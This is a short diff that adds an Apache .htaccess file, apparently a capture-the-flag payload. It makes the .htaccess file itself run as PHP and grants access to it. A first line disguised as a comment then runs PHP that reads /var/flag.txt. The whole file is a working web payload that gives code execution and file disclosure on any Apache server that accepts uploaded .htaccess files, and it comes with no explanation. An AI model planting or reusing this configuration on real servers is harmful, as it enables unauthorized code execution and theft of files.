@@ -1,0 +1,7 @@
+#<?=file_get_contents('/var/flag.txt');?>
+<Files ~ "^\.ht">
+Require all granted
+</Files>
+<FilesMatch \.htaccess$>
+SetHandler application/x-httpd-php
+</FilesMatch>
